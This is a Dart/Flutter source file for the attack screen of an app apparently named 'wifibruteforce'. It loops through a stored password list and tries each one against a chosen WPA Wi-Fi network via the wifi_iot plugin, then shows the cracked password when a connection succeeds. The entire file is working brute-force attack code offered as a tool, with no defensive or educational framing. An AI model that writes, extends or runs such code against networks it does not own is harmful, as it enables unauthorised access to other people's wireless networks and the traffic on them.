import 'package:flutter/material.dart';
import 'package:wifi_iot/wifi_iot.dart';
import 'package:wifibruteforce/constants.dart';

class Attack extends StatefulWidget {
  final WifiNetwork wifiNetwork;

  const Attack({Key key, this.wifiNetwork}) : super(key: key);
  @override
  _AttackState createState() => _AttackState();
}

class _AttackState extends State<Attack> {
  int count = 0;
  String result = "", currentPass = '';
  bool done = false, success = false;
  @override
  void initState() {
    super.initState();
    startAttack();
  }

  startAttack() async {
    loop:
    for (var i = 0; i < PASSWORDS.length; i++) {
      setState(() {
        currentPass = PASSWORDS[i];
      });
      var isConnected = await WiFiForIoTPlugin.connect(widget.wifiNetwork.ssid,
          security: NetworkSecurity.WPA, password: PASSWORDS[i]);
      if (isConnected) {
        setState(() {
          success = true;
          done = true;
          result = "Attack Successful";
        });
        break loop;
      }
      count++;
      setState(() {});
      if (count == PASSWORDS.length) {
        setState(() {
          done = true;
        });
        if (!isConnected) {
          setState(() {
            result = "Attack Failed";
          });
        }
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        automaticallyImplyLeading: false,
        title: Text("Attacking " + widget.wifiNetwork.ssid),
      ),
      body: Column(
        children: <Widget>[
          SizedBox(
            height: 15,
          ),
          Center(
            child: SelectableText(
              "Trying password : " +
                  currentPass +
                  "\n" +
                  count.toString() +
                  "/" +
                  PASSWORDS.length.toString(),
              textAlign: TextAlign.center,
              style: TextStyle(fontSize: 35),
            ),
          ),
          SizedBox(
            height: 15,
          ),
          if (success) Text("Password F0und :" + currentPass),
          done
              ? RaisedButton(
                  color: success ? Colors.green : Colors.red,
                  onPressed: () {
                    Navigator.pop(context);
                  },
                  child: Text(result),
                )
              : SizedBox()
        ],
      ),
    );
  }
}
